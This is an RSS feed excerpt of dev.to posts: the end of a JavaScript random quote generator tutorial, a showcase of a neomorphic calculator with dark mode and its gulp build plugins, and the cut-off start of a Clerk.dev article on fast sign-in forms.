        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;If you set your goals ridiculously high and it`s a failure, you will fail above everyone else`s success&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Elbert Hubbard&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Do not take life too seriously. You will not get out alive.&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;John Lennon&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Life is what happens when you`re busy making other plans.&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="c1"&gt;// Create a function to generate quote from array&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;generateQoute&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;random&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;parseInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;arrayOfQuotes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;#generatedQuote&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;textContent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`\"&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;arrayOfQuotes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;random&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;quote&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;\"`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;#AuthorName&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;textContent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`--&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;arrayOfQuotes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;random&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;author&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#random-quote-generator-final-result"&gt;
  &lt;/a&gt;
  Random Quote Generator Final Result
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/4t0U-B_9Kpw"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>html</category>
      <category>css</category>
      <category>javascript</category>
      <category>beginners</category>
    </item>
    <item>
      <title>💓 Beautiful Neomorphic Calculator 🧮 + Dark Mode 🖤</title>
      <author>Roden</author>
      <pubDate>Fri, 02 Jul 2021 16:34:17 +0000</pubDate>
      <link>https://dev.to/kerthin/beautiful-neomorphic-calculator-dark-mode-6jm</link>
      <guid>https://dev.to/kerthin/beautiful-neomorphic-calculator-dark-mode-6jm</guid>
      <description>&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Over the past year or even more, it is difficult not to pay attention to how interest in Neomorphism is rapidly growing in web design. And indeed, it is difficult to pass by such an unusual approach in the development of interfaces. Also, many developers have been posting their work on various resources for a long time, demonstrating how using simple shadows you can create beautiful and unusual elements. So I also decided to keep up.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/rZ0nZg8ZSFYzu/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/rZ0nZg8ZSFYzu/giphy.gif" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Therefore, today I would like to present to you my calculator made in the style of Neomorphism. It also has a Dark Theme, which you can launch using the switch in the upper right corner.&lt;/p&gt;

&lt;p&gt;You can download the project from my &lt;strong&gt;Github&lt;/strong&gt; repository or &lt;strong&gt;CodePen&lt;/strong&gt;.&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Kerthin"&gt;
        Kerthin
      &lt;/a&gt; / &lt;a href="https://github.com/Kerthin/calculator-templateSait"&gt;
        calculator-templateSait
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      A calculator made in the style of neomorphism.
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img width="100" src="https://res.cloudinary.com/practicaldev/image/fetch/s--14z30vUK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/squirrelAppIcon.png" alt="Kerthin logo"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img src="https://camo.githubusercontent.com/3aaee52aea7e26ea020e0c2bac3ea70c011c1cc0507999c2c8b91c121b7fe9ba/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6275696c642d70617373696e672d627269676874677265656e2e737667" alt="Build Status"&gt;&lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img src="https://camo.githubusercontent.com/9131d6ef04409049c328ce7a6f6a175e64f1374adac1f18ffaf89a8f2889e366/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f6d706c6574696f6e2d32302532352d6f72616e67652e737667" alt="completion Status"&gt;&lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img src="https://camo.githubusercontent.com/0ef94bb3d6bdf5fec0c3f5452111c9dd1b2d4c82518f871f6da0dd27fce5910d/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76362e31342e342d626c75652e737667" alt="Version"&gt;&lt;/a&gt; &lt;br&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img src="https://camo.githubusercontent.com/e2c7bcf456840ac212cd09701b26b6d86ed89b7780dde7ef35aa3d5c2312af9b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e6f64652d7631302e31362e302d626c75652e737667" alt="Version"&gt;&lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img src="https://camo.githubusercontent.com/0f65d45420ca4ebd6b698cfb148c8afe07b9171f58927bc05dbebabec24d8948/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f7265706f25323073697a652d302e372532304d422d677265656e2e737667" alt="Size"&gt;&lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;&lt;img src="https://camo.githubusercontent.com/dcc0fe2b2da3287aa7d01b012f6a8892fba7af66d73a68fd0b24e7f412094aad/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f70726f6a65637425323076657273696f6e2d76312d626c75652e737667" alt="Version"&gt;&lt;/a&gt;
&lt;/p&gt;

&lt;h2&gt;
Description&lt;/h2&gt;

&lt;p&gt;The project is a working calculator made in the style of neomorphism.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kerthin.github.io/calculator-templateSait/" rel="nofollow"&gt;Demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
Use technology.&lt;/h4&gt;

&lt;p&gt;The following technologies were used to create this project:&lt;/p&gt;

&lt;h3&gt;
Task-Manager&lt;/h3&gt;

&lt;p&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="160px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_hz09VL5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/gulp.svg"&gt;
  &lt;/a&gt;
&lt;/p&gt;

&lt;h3&gt;
Software platform&lt;/h3&gt;

&lt;p&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="260px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--UaWA_sHi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/nodejs-1.svg"&gt;
  &lt;/a&gt;
&lt;/p&gt;

&lt;h3&gt;
Preprocessors&lt;/h3&gt;

&lt;p&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="144px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--iMGZ9x8j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/pug.svg"&gt;
  &lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="144px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--9_1pGKXT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/sass-1.svg"&gt;
  &lt;/a&gt;
&lt;/p&gt;

&lt;h3&gt;
Package manager&lt;/h3&gt;

&lt;p&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="144px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--zwGX90SR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/bower.svg"&gt;
  &lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="144px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--hrj5ybZz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/npm.svg"&gt;
  &lt;/a&gt;
&lt;/p&gt;

&lt;h3&gt;
Languages&lt;/h3&gt;

&lt;p&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="124px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--XDY0yU6p--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/html-5.svg"&gt;
  &lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="124px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--SjB1qgWl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/css-3.svg"&gt;
  &lt;/a&gt;
  &lt;a href="https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/#"&gt;
    &lt;img width="124px" src="https://res.cloudinary.com/practicaldev/image/fetch/s--06ivqciR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Kerthin/calculator-templateSait/master/READMEimage/javascript.svg"&gt;
  &lt;/a&gt;
&lt;/p&gt;




&lt;h2&gt;
Plugins&lt;/h2&gt;

&lt;p&gt;To develop the project through gulp, I used the following types of NPM plugins:&lt;/p&gt;


&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;br&gt;
&lt;thead&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;th&gt;Plugin&lt;/th&gt;
&lt;br&gt;
&lt;th&gt;Status&lt;/th&gt;
&lt;br&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;/thead&gt;
&lt;br&gt;
&lt;tbody&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-sourcemaps" rel="nofollow"&gt;gulp-sourcemaps&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-sourcemaps" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/528a1ebd364b693bb3d0101b0673c41e655019ffd2f9bdc0d1d6ee92e2641899/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76322e362e342d626c75652e737667" alt="gulp-sourcemaps-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;Intended for generation of &lt;code&gt;css source maps&lt;/code&gt; which will be necessary at debugging of a code.&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-imagemin" rel="nofollow"&gt;gulp-imagemin&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-imagemin" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/711705519071329822e444430727735680a0559653d21c428730d5f74dacef31/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76342e312e302d626c75652e737667" alt="gulp-imagemin-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;Minify &lt;code&gt;PNG&lt;/code&gt;, &lt;code&gt;JPEG&lt;/code&gt;, &lt;code&gt;GIF&lt;/code&gt; and &lt;code&gt;SVG&lt;/code&gt; images with &lt;code&gt;imagemin&lt;/code&gt;&lt;br&gt;
&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-autoprefixer" rel="nofollow"&gt;gulp-autoprefixer&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-autoprefixer" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/98049dfc0610712ebdfca9ffac989e2d2b0693eec4fd386e15242b7eeec66552/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76362e302e302d626c75652e737667" alt="gulp-autoprefixer-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;Prefix &lt;code&gt;CSS&lt;/code&gt; with &lt;code&gt;Autoprefixer&lt;/code&gt;&lt;br&gt;
&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/imagemin-pngquant" rel="nofollow"&gt;imagemin-pngquant&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/imagemin-pngquant" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/98049dfc0610712ebdfca9ffac989e2d2b0693eec4fd386e15242b7eeec66552/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76362e302e302d626c75652e737667" alt="imagemin-pngquant-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;
&lt;br&gt;
&lt;code&gt;Pngquant imagemin&lt;/code&gt; plugin&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-uglify" rel="nofollow"&gt;gulp-uglify&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-uglify" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b2b4a07c63198d7e5f42f3b13e24079c5ffbc9c3527a41f9179a171d7f0e4f0f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76332e302e312d626c75652e737667" alt="gulp-uglify-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;Minify &lt;code&gt;JavaScript&lt;/code&gt; with &lt;code&gt;UglifyJS3&lt;/code&gt;.&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-rigger" rel="nofollow"&gt;gulp-rigger&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-rigger" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/503c5942f276fc051f3b969da0dbaaf76a0aa9bb080825ceafda298f5fb986fa/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76302e352e382d626c75652e737667" alt="gulp-rigger-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;
&lt;br&gt;
&lt;code&gt;Rigger&lt;/code&gt; is a build time include engine for &lt;code&gt;Javascript&lt;/code&gt;, &lt;code&gt;CSS&lt;/code&gt;, &lt;code&gt;CoffeeScript&lt;/code&gt;.&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-clean-css" rel="nofollow"&gt;gulp-minify-css&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-clean-css" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b4d51093e94d643642cc5875f38df3914480590a4cc9720463e6c100ad1a203d/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76332e31302e302d626c75652e737667" alt="gulp-minify-css-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;
&lt;br&gt;
&lt;code&gt;Gulp&lt;/code&gt; plugin to minify &lt;code&gt;CSS&lt;/code&gt;&lt;br&gt;
&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/rimraf" rel="nofollow"&gt;rimraf&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/rimraf" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/cfbb87eb7037ab4f0aa7470555d074f84bb49b210d547a680b7b75d9608432bb/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76322e362e322d626c75652e737667" alt="rimraf-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;The &lt;code&gt;UNIX&lt;/code&gt; command &lt;code&gt;rm&lt;/code&gt; &lt;code&gt;-rf&lt;/code&gt; for node.&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-watch" rel="nofollow"&gt;gulp-watch&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-watch" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/ac8499db04cba84bee8f0e495626d8be65ee98015cda17685ecd617944488313/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76352e302e312d626c75652e737667" alt="gulp-watch-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;File watcher that uses super-fast chokidar and emits vinyl objects.&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;tr&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-pug" rel="nofollow"&gt;gulp-pug&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;&lt;a href="https://www.npmjs.com/package/gulp-pug" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/2a327be8bab18c0e8d2ec198f6cfa944626fa415e40546817917de1bf37b43ff/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e706d2d76342e302e312d626c75652e737667" alt="gulp-pug-status"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;br&gt;
&lt;td&gt;This &lt;code&gt;Gulp&lt;/code&gt; plugin enables you to compile your &lt;code&gt;Pug&lt;/code&gt; templates into &lt;code&gt;HTML&lt;/code&gt; or &lt;code&gt;JS&lt;/code&gt;.&lt;/td&gt;
&lt;br&gt;
&lt;/tr&gt;
&lt;br&gt;
&lt;/tbody&gt;
&lt;br&gt;
&lt;/table&gt;&lt;/div&gt;…&lt;/div&gt;
&lt;br&gt;
  &lt;/div&gt;
&lt;br&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Kerthin/calculator-templateSait"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;br&gt;
&lt;/div&gt;
&lt;br&gt;


&lt;p&gt;&lt;a href="https://kerthin.github.io/calculator-templateSait/"&gt;&lt;h1&gt;Full Page Demo&lt;/h1&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/7Pe37n2eB0lC03ZouU/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/7Pe37n2eB0lC03ZouU/giphy.gif" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;Dark Mode&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/FDmQNyl8tEzEYpDwFh/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/FDmQNyl8tEzEYpDwFh/giphy.gif" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;CodePen&lt;/h1&gt;

&lt;p&gt;(See in the format &lt;code&gt;0.5x&lt;/code&gt;)&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/Astap/embed/abWOXrR?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h1&gt;Responsive&lt;/h1&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/y8EKnAYyJnSE6qQMuu/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/y8EKnAYyJnSE6qQMuu/giphy.gif" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The site is adapted for screen resolutions such as:&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;@media 414px&lt;/code&gt;&lt;br&gt;
&lt;code&gt;@media 375px&lt;/code&gt;&lt;br&gt;
&lt;code&gt;@media 320px&lt;/code&gt;&lt;/p&gt;

&lt;h1&gt;The End&lt;/h1&gt;

&lt;p&gt;Well, that's it. The project is very small, so there is no need to write large texts here. Thank you for paying attention to my article. Goodbye.&lt;/p&gt;

&lt;p&gt;I can advise you to subscribe to my &lt;a href="https://twitter.com/BelichenkoRoden"&gt;&lt;strong&gt;Twitter&lt;/strong&gt;&lt;/a&gt;, I also post my works there.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.S.&lt;/strong&gt;&lt;br&gt;
After each mathematical action, press the &lt;code&gt;equal sign&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/m9eG1qVjvN56H0MXt8/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/m9eG1qVjvN56H0MXt8/giphy.gif" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>javascript</category>
      <category>css</category>
      <category>codepen</category>
    </item>
    <item>
      <title>Designing fast sign in forms— diving into the data</title>
      <author>Clerk.dev</author>
      <pubDate>Fri, 02 Jul 2021 16:12:48 +0000</pubDate>
      <link>https://dev.to/clerk/designing-fast-sign-in-forms-diving-into-the-data-587j</link>
      <guid>https://dev.to/clerk/designing-fast-sign-in-forms-diving-into-the-data-587j</guid>
      <description>&lt;p&gt;The modern web is obsessed with speed. Just this week, Vercel &lt;a href="https://nextjs.org/blog/next-11"&gt;launched Next.js 11&lt;/a&gt; with a special focus on &lt;a href="https://web.dev/vitals/"&gt;Core Web Vitals&lt;/a&gt;, a new set Google metrics that are measured in tens of milliseconds to determine page speed. Google has noticed that faster websites mean better user experiences, and has incorporated these metrics into their search ranking algorithms.&lt;/p&gt;

&lt;p&gt;At &lt;a href="https://clerk.dev/?utm_source=devto&amp;amp;utm_medium=blog&amp;amp;utm_campaign=crossposting"&gt;Clerk&lt;/a&gt;, we're focused on a speed challenge that's equally important but often neglected: &lt;strong&gt;how quickly can users sign in?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In working to optimize our prebuilt Sign In UI, we've learned a few surprising lessons we thought are worth sharing.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#social-sign-in-deserves-the-top-spot"&gt;
  &lt;/a&gt;
  Social Sign In deserves the top spot
&lt;/h2&gt;

&lt;p&gt;After much qualitative debate - &lt;a href="https://clerk.dev/?utm_source=devto&amp;amp;utm_medium=blog&amp;amp;utm_campaign=crossposting"&gt;Clerk&lt;/a&gt; originally launched with Google and Facebook sign in buttons &lt;em&gt;below&lt;/em&gt; the option to sign in by email.  &lt;/p&gt;

